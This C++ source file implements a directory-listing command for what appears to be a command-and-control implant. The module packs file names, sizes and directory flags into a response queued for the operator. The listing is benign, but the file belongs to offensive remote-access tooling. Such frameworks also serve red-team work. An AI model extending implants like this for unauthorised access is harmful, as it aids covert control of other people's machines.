#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_LS

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_ls(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t path_len = 0;
    auto path = parser_string( params, &path_len );

    char path_buf[520] = { 0 };
    if ( path && path_len > 0 ) {
        uint32_t copy_len = path_len < 515 ? path_len : 515;
        memory::copy( path_buf, path, copy_len );
    } else {
        path_buf[0] = '.';
    }

    // append \* for FindFirstFile
    str_concat( path_buf, symbol<char*>( const_cast<char*>( "\\*" ) ) );

    wchar_t wpath[520] = { 0 };
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, path_buf, -1, wpath, 520 );

    WIN32_FIND_DATAW fd = {};
    HANDLE h_find = inst.kernel32.FindFirstFileW( wpath, &fd );

    if ( h_find == INVALID_HANDLE_VALUE ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "FindFirstFileW failed" ) ) );
        return;
    }

    // build TLV response with file entries
    auto pkg = package_create( inst );
    if ( !pkg ) {
        inst.kernel32.FindClose( h_find );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    package_add_byte( inst, pkg, ACTION_POST_RESPONSE );
    package_add_string( inst, pkg, task_uuid );
    package_add_byte( inst, pkg, RESPONSE_SUCCESS );

    // count files first pass - skip, just pack directly
    // format: count(uint32) then for each: name(string) + size(uint32) + is_dir(byte)
    // we'll use a sub-package for entries then prepend count

    uint32_t count = 0;
    auto entries = package_create( inst );

    do {
        char name[260] = { 0 };
        inst.kernel32.WideCharToMultiByte( CP_ACP, 0, fd.cFileName, -1, name, 260, nullptr, nullptr );

        // skip . and ..
        if ( name[0] == '.' && (name[1] == '\0' || (name[1] == '.' && name[2] == '\0')) )
            continue;

        package_add_string( inst, entries, name );

        uint32_t file_size = fd.nFileSizeLow;
        package_add_int32( inst, entries, file_size );

        uint8_t is_dir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 1 : 0;
        package_add_byte( inst, entries, is_dir );

        count++;
    } while ( inst.kernel32.FindNextFileW( h_find, &fd ) );

    inst.kernel32.FindClose( h_find );

    // pack full path for file browser integration
    {
        char full_path[520] = { 0 };
        if ( path && path_len > 0 && path[0] != '.' ) {
            memory::copy( full_path, path, path_len < 515 ? path_len : 515 );
        } else {
            wchar_t cwd_w[260] = { 0 };
            inst.kernel32.GetCurrentDirectoryW( 260, cwd_w );
            inst.kernel32.WideCharToMultiByte( CP_ACP, 0, cwd_w, -1, full_path, 520, nullptr, nullptr );
        }
        package_add_string( inst, pkg, full_path );
    }

    // pack count + entries into main package
    package_add_int32( inst, pkg, count );
    uint32_t entries_len = 0;
    auto entries_data = package_build( entries, &entries_len );
    if ( entries_len > 0 ) {
        // raw append without length prefix
        for ( uint32_t i = 0; i < entries_len; i++ ) {
            package_add_byte( inst, pkg, entries_data[i] );
        }
    }
    package_destroy( inst, entries );

    // queue the custom response package
    uint32_t data_len = 0;
    auto data = package_build( pkg, &data_len );

    uint32_t needed = inst.response_queue.length + 4 + data_len;
    if ( needed > inst.response_queue.capacity ) {
        uint32_t new_cap = inst.response_queue.capacity == 0 ? 1024 : inst.response_queue.capacity;
        while ( new_cap < needed ) new_cap *= 2;
        inst.response_queue.buffer = static_cast<uint8_t*>(
            inst.heap_realloc( inst.response_queue.buffer, new_cap )
        );
        inst.response_queue.capacity = new_cap;
    }

    auto buf = inst.response_queue.buffer + inst.response_queue.length;
    buf[0] = (data_len >> 24) & 0xFF;
    buf[1] = (data_len >> 16) & 0xFF;
    buf[2] = (data_len >> 8)  & 0xFF;
    buf[3] = data_len & 0xFF;
    memory::copy( buf + 4, data, data_len );
    inst.response_queue.length += 4 + data_len;

    package_destroy( inst, pkg );
}

#endif
